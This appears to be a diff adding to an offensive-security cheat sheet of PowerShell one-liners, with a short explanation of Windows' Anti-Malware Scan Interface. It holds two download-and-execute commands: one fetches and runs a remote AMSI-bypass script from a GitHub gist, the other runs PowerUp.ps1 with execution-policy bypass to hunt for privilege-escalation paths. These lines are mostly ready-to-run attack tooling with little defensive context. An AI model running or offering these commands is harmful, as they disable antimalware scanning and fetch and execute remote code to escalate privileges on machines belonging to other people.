@@ -1,3 +1,10 @@
+####AMSI Bypass PS Script#####
+https://www.contextis.com/en/blog/amsi-bypass
+AMSI stands for Anti-Malware Scan Interface and was introduced in Windows 10. The name is reasonably self-explanatory; this is an interface that applications and services are able to utilise, sending “content” to an anti-malware provider installed on the system (e.g. Windows Defender)
+
+iex (new-object net.webclient).downloadstring('https://gist.githubusercontent.com/amonsec/986db36000d82b39c73218facc557628/raw/6b8587154ac478091388bc56d9a04283953800b8/AMSI-Bypass.ps1') 
+
+------------------------------------------------------------
 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
 
 
